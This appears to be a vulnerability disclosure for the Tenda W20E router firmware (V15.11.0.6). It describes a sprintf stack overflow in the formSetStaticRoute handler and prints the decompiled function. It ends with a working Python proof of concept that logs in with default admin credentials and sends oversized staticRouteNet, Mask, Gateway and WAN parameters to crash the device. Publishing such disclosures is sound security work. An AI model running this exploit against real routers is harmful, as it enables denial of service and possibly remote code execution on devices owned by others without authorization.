# Tenda W20E

### version

```
V15.11.0.6 （US_W20EV4.0br_V15.11.0.6（1068_1546_841）_CN_TDC）
```

### Firmware

```
https://www.tenda.com.cn/download/detail-2707.html
```



## setStaticRoute

### detail

In function formSetStaticRoute,the content obtained by the program from the parameter "staticRouteNet","staticRouteMask","staticRouteGateway","staticRouteWAN" are passed to net,mask,gateway and wan.Then the net,mask,gateway and wan are directly copied into the sMibValue stack through the sprintf function.There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.

```c
void __cdecl formSetStaticRoute(webs_t wp, char_t *pPath, char_t *pQuery)
{
  int v3; // r0
  int v4; // r3
  int v5; // r0
  unsigned __int8 sNetctlParm[32]; // [sp+18h] [bp-164h] BYREF
  unsigned __int8 sMibName[32]; // [sp+38h] [bp-144h] BYREF
  unsigned __int8 sMibValue[256]; // [sp+58h] [bp-124h] BYREF
  int iListNum; // [sp+158h] [bp-24h]
  int iRouteIndex; // [sp+15Ch] [bp-20h]
  unsigned __int8 *wan; // [sp+160h] [bp-1Ch]
  unsigned __int8 *gateway; // [sp+164h] [bp-18h]
  unsigned __int8 *mask; // [sp+168h] [bp-14h]
  unsigned __int8 *net; // [sp+16Ch] [bp-10h]
  char_t *pRouteIndex; // [sp+170h] [bp-Ch]
  int iWanid; // [sp+174h] [bp-8h]

  pRouteIndex = 0;
  net = 0;
  mask = 0;
  gateway = 0;
  wan = 0;
  memset(sMibValue, 0, sizeof(sMibValue));
  *(_DWORD *)sMibName = 0;
  *(_DWORD *)&sMibName[4] = 0;
  *(_DWORD *)&sMibName[8] = 0;
  *(_DWORD *)&sMibName[12] = 0;
  *(_DWORD *)&sMibName[16] = 0;
  *(_DWORD *)&sMibName[20] = 0;
  *(_DWORD *)&sMibName[24] = 0;
  *(_DWORD *)&sMibName[28] = 0;
  *(_DWORD *)sNetctlParm = 0;
  *(_DWORD *)&sNetctlParm[4] = 0;
  *(_DWORD *)&sNetctlParm[8] = 0;
  *(_DWORD *)&sNetctlParm[12] = 0;
  *(_DWORD *)&sNetctlParm[16] = 0;
  *(_DWORD *)&sNetctlParm[20] = 0;
  *(_DWORD *)&sNetctlParm[24] = 0;
  *(_DWORD *)&sNetctlParm[28] = 0;
  iRouteIndex = 0;
  iListNum = 0;
  iWanid = 0;
  pRouteIndex = websGetVar(wp, "staticRouteIndex", byte_CFE00);
  iRouteIndex = atoi((const char *)pRouteIndex);
  if ( iRouteIndex + 1 <= 10 )
  {
    net = websGetVar(wp, "staticRouteNet", byte_CFE00);
    mask = websGetVar(wp, "staticRouteMask", byte_CFE00);
    gateway = websGetVar(wp, "staticRouteGateway", byte_CFE00);
    wan = websGetVar(wp, "staticRouteWAN", byte_CFE00);
    if ( !strncmp("wan1", (const char *)wan, 4u) )
    {
      iWanid = 0;
    }
    else if ( !strncmp("wan2", (const char *)wan, 4u) )
    {
      iWanid = 1;
    }
    else if ( !strncmp("wan3", (const char *)wan, 4u) )
    {
      iWanid = 2;
    }
    else if ( !strncmp("wan4", (const char *)wan, 4u) )
    {
      iWanid = 3;
    }
    sprintf((char *)sMibValue, "%s;%s;%s;%d;WAN0", (const char *)net, (const char *)mask, (const char *)gateway, iWanid);
    sprintf((char *)sMibName, "adv.staticroute.list%d", iRouteIndex + 1);
    SetValue(sMibName, sMibValue);
    memset(sMibValue, 0, sizeof(sMibValue));
    GetValue("adv.staticroute.listnum", sMibValue);
    v3 = atoi((const char *)sMibValue);
    iListNum = v3;
    v4 = iRouteIndex + 1;
    if ( v3 >= iRouteIndex + 1 )
      v4 = v3;
    iListNum = v4;
    memset(sMibValue, 0, sizeof(sMibValue));
    sprintf((char *)sMibValue, "%d", iListNum);
    v5 = SetValue("adv.staticroute.listnum", sMibValue);
    if ( CommitCfm(v5) )
    {
      sprintf((char *)sNetctlParm, "advance_type=%d", 8);
      send_msg_to_netctrl(5, sNetctlParm);
    }
    outputToWebs(wp, "1");
  }
  else
  {
    puts("Static route list out of range");
  }
  outputToWebs(wp, "-1");
}
```



### poc

```python
import requests

cmd  = b'staticRouteIndex=' + b'9' 
cmd += b'&staticRouteNet=' + b'A' * 500
cmd += b'&staticRouteMask=' + b'A' * 500
cmd += b'&staticRouteGateway=' + b'A' * 500
cmd += b'&staticRouteWAN=' + b'A' * 500

url = b"http://192.168.0.1/login/Auth"
payload = b"http://192.168.0.1/goform/setStaticRoute/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

